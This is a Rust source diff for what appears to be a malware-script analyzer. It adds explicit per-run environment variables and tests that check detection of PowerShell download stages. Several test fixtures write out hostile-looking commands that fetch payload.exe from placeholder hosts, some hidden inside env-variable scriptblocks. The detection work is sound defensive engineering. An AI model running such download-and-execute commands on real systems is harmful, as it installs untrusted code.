@@ -4173,14 +4173,14 @@ mod ps_iwr_variants_tests {
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "http://x.example/a.pdf"
-                        && dst.as_deref() == Some("$env:temp\\a.pdf")
+                        && dst.as_deref() == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\a.pdf")
             )
         });
         let has_exe = report.traits.iter().any(|t| {
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "http://x.example/b.exe"
-                        && dst.as_deref() == Some("$env:temp\\b.exe")
+                        && dst.as_deref() == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\b.exe")
             )
         });
         assert!(
@@ -4334,6 +4334,80 @@ mod start_title_tests {
 
 pub use env::{Config, Environment, WinVer};
 pub use traits::Trait;
+
+#[cfg(test)]
+mod explicit_environment_tests {
+    use super::{analyze, analyze_with_options, AnalysisOptions, Config, Trait};
+
+    #[test]
+    fn explicit_environment_unlocks_powershell_env_scriptblock() {
+        let script = br#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#;
+        let options = AnalysisOptions::with_environment(vec![(
+            "HARRINGTON_STAGE".to_string(),
+            "Invoke-WebRequest https://env-stage.example/payload.exe -OutFile payload.exe"
+                .to_string(),
+        )]);
+
+        let report = analyze_with_options(script, &Config::default(), &options);
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://env-stage.example/payload.exe"
+                )
+            }),
+            "explicit env did not unlock PowerShell stage: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn process_environment_is_not_implicitly_imported() {
+        let script = br#"powershell -Command "&([scriptblock]::Create($env:HARRINGTON_STAGE))""#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("env-stage.example")
+                )
+            }),
+            "ambient environment should not affect analysis: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn digit_leading_powershell_environment_name_expands() {
+        let script =
+            br#"powershell -Command "$u=$env:8STAGE;Invoke-WebRequest $u -OutFile payload.exe""#;
+        let options = AnalysisOptions::with_environment(vec![(
+            "8STAGE".to_string(),
+            "https://digit-env.example/payload.exe".to_string(),
+        )]);
+
+        let report = analyze_with_options(script, &Config::default(), &options);
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://digit-env.example/payload.exe"
+                )
+            }),
+            "digit-leading env variable did not expand in PowerShell: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+}
 
 #[derive(Debug, Clone)]
 #[non_exhaustive]
@@ -4592,7 +4666,7 @@ fn looks_like_utf16le(bytes: &[u8]) -> bool {
 /// structural signals + caps), and extracted child cmd/ps1 payloads
 /// (raw bytes plus a normalized form for the ps1 cases).
 pub fn analyze(input: &[u8], cfg: &Config) -> Report {
-    analyze_inner(input, cfg, None)
+    analyze_inner(input, cfg, None, &AnalysisOptions::default())
 }
 
 /// Analyze a sample while also providing its original filesystem path.
@@ -4605,11 +4679,56 @@ pub fn analyze_with_path(
     cfg: &Config,
     file_path: impl AsRef<std::path::Path>,
 ) -> Report {
-    analyze_inner(input, cfg, Some(file_path.as_ref().to_path_buf()))
+    analyze_inner(
+        input,
+        cfg,
+        Some(file_path.as_ref().to_path_buf()),
+        &AnalysisOptions::default(),
+    )
 }
 
-fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBuf>) -> Report {
+/// Additional per-analysis inputs that should not become global defaults.
+///
+/// `environment` is an explicit, case-insensitive Windows environment map.
+/// It lets callers replay sandbox child commands that reference `$env:NAME`
+/// or `%NAME%` without making analysis depend on the analyst process env.
+#[derive(Debug, Clone, Default)]
+#[non_exhaustive]
+pub struct AnalysisOptions {
+    pub environment: Vec<(String, String)>,
+}
+
+impl AnalysisOptions {
+    pub fn with_environment(environment: Vec<(String, String)>) -> Self {
+        Self { environment }
+    }
+}
+
+/// Analyze a sample with explicit per-run options.
+pub fn analyze_with_options(input: &[u8], cfg: &Config, options: &AnalysisOptions) -> Report {
+    analyze_inner(input, cfg, None, options)
+}
+
+/// Analyze a sample with explicit per-run options and input-path context.
+pub fn analyze_with_path_and_options(
+    input: &[u8],
+    cfg: &Config,
+    file_path: impl AsRef<std::path::Path>,
+    options: &AnalysisOptions,
+) -> Report {
+    analyze_inner(input, cfg, Some(file_path.as_ref().to_path_buf()), options)
+}
+
+fn analyze_inner(
+    input: &[u8],
+    cfg: &Config,
+    file_path: Option<std::path::PathBuf>,
+    options: &AnalysisOptions,
+) -> Report {
     let mut env = Environment::new(cfg);
+    for (name, value) in &options.environment {
+        env.seed(name, value);
+    }
     env.file_path = file_path;
     if cfg.self_extract {
         env.input_bytes = Some(std::sync::Arc::from(input));
